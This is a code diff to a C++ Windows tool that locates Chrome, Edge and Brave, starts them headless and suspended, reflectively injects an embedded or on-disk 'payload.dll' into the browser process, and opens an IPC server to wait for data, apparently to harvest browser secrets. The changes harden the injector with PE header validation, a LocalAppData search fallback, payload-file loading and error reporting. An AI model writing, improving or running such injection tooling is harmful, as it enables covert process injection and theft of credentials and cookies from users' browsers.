@@ -66,7 +66,11 @@ const BrowserConfig BROWSERS[] = {
     { L"Brave", L"brave.exe", { L"C:\\Program Files\\BraveSoftware\\Brave-Browser\\Application\\brave.exe", L"C:\\Program Files (x86)\\BraveSoftware\\Brave-Browser\\Application\\brave.exe" } }
 };
 
+#include <shlobj.h>
 std::wstring find_browser_exe(const std::wstring& name) {
+    wchar_t local_app_data[MAX_PATH];
+    SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, local_app_data);
+
     for (const auto& config : BROWSERS) {
         std::wstring bname = config.name;
         std::transform(bname.begin(), bname.end(), bname.begin(), ::towlower);
@@ -78,6 +82,15 @@ std::wstring find_browser_exe(const std::wstring& name) {
                 if (GetFileAttributesW(path) != INVALID_FILE_ATTRIBUTES) {
                     return path;
                 }
+            }
+            // Check LocalAppData fallback
+            std::wstring local_path = local_app_data;
+            if (target == L"chrome") local_path += L"\\Google\\Chrome\\Application\\chrome.exe";
+            else if (target == L"edge") local_path += L"\\Microsoft\\Edge\\Application\\msedge.exe";
+            else if (target == L"brave") local_path += L"\\BraveSoftware\\Brave-Browser\\Application\\brave.exe";
+
+            if (GetFileAttributesW(local_path.c_str()) != INVALID_FILE_ATTRIBUTES) {
+                return local_path;
             }
         }
     }
@@ -178,9 +191,21 @@ void WINAPI __attribute__((section(".text"))) realign_pe(DllInfo* dll_info) {
 
 void WINAPI realign_pe_end() {}
 
-void inject_dll_reflective(HANDLE h_process, const std::vector<unsigned char>& dll_bytes) {
+bool inject_dll_reflective(HANDLE h_process, const std::vector<unsigned char>& dll_bytes) {
+    if (dll_bytes.size() < sizeof(IMAGE_DOS_HEADER)) {
+        std::cerr << "[-] DLL bytes too small" << std::endl;
+        return false;
+    }
     auto dos_header = (PIMAGE_DOS_HEADER)dll_bytes.data();
+    if (dos_header->e_magic != IMAGE_DOS_SIGNATURE) {
+        std::cerr << "[-] Invalid DOS signature" << std::endl;
+        return false;
+    }
     auto nt_headers = (PIMAGE_NT_HEADERS64)((size_t)dll_bytes.data() + dos_header->e_lfanew);
+    if (nt_headers->Signature != IMAGE_NT_SIGNATURE) {
+        std::cerr << "[-] Invalid NT signature" << std::endl;
+        return false;
+    }
 
     size_t image_size = nt_headers->OptionalHeader.SizeOfImage;
     void* remote_base = VirtualAllocEx(h_process, (void*)nt_headers->OptionalHeader.ImageBase, image_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
@@ -208,9 +233,7 @@ void inject_dll_reflective(HANDLE h_process, const std::vector<unsigned char>& d
         relocation_required
     };
 
-    size_t bootstrapper_size = (size_t)realign_pe_end - (size_t)realign_pe;
-    if (bootstrapper_size == 0) bootstrapper_size = 4096;
-
+    size_t bootstrapper_size = 4096; // Use a fixed safe size for the shellcode
     size_t total_size = sizeof(DllInfo) + bootstrapper_size;
     void* remote_mem = VirtualAllocEx(h_process, NULL, total_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
 
@@ -222,7 +245,10 @@ void inject_dll_reflective(HANDLE h_process, const std::vector<unsigned char>& d
     if (h_thread) {
         WaitForSingleObject(h_thread, INFINITE);
         CloseHandle(h_thread);
+        return true;
     }
+    std::cerr << "[-] Failed to create remote thread: " << GetLastError() << std::endl;
+    return false;
 }
 
 void start_ipc_server(const std::wstring& browser_name) {
@@ -263,6 +289,22 @@ int main(int argc, char* argv[]) {
     }
 
     std::vector<unsigned char> dll_bytes = base64_decode(EMBEDDED_DLL_BASE64);
+    if (dll_bytes.size() < 100) { // If placeholder or invalid
+        std::cout << "[*] Embedded DLL not found or invalid, trying payload.dll..." << std::endl;
+        HANDLE hFile = CreateFileA("payload.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
+        if (hFile != INVALID_HANDLE_VALUE) {
+            DWORD size = GetFileSize(hFile, NULL);
+            dll_bytes.resize(size);
+            DWORD read;
+            ReadFile(hFile, dll_bytes.data(), size, &read, NULL);
+            CloseHandle(hFile);
+        }
+    }
+
+    if (dll_bytes.empty()) {
+        std::cerr << "[-] No DLL bytes available for injection." << std::endl;
+        return 1;
+    }
 
     for (const auto& config : BROWSERS) {
         if (browser != L"all" && _wcsicmp(browser.c_str(), config.name) != 0) continue;
@@ -280,12 +322,18 @@ int main(int argc, char* argv[]) {
 
         std::wstring cmd = L"\"" + exe_path + L"\" --headless --disable-gpu";
         if (CreateProcessW(NULL, (LPWSTR)cmd.c_str(), NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
-            inject_dll_reflective(pi.hProcess, dll_bytes);
-            ResumeThread(pi.hThread);
-            start_ipc_server(config.name);
+            if (inject_dll_reflective(pi.hProcess, dll_bytes)) {
+                ResumeThread(pi.hThread);
+                std::cout << "[+] Injected and resumed thread. Waiting for data..." << std::endl;
+                start_ipc_server(config.name);
+            } else {
+                std::cerr << "[-] Injection failed for " << config.name << std::endl;
+            }
             TerminateProcess(pi.hProcess, 0);
             CloseHandle(pi.hProcess);
             CloseHandle(pi.hThread);
+        } else {
+            std::cerr << "[-] Failed to start browser " << config.name << " at " << std::string(exe_path.begin(), exe_path.end()) << " Error: " << GetLastError() << std::endl;
         }
     }
 
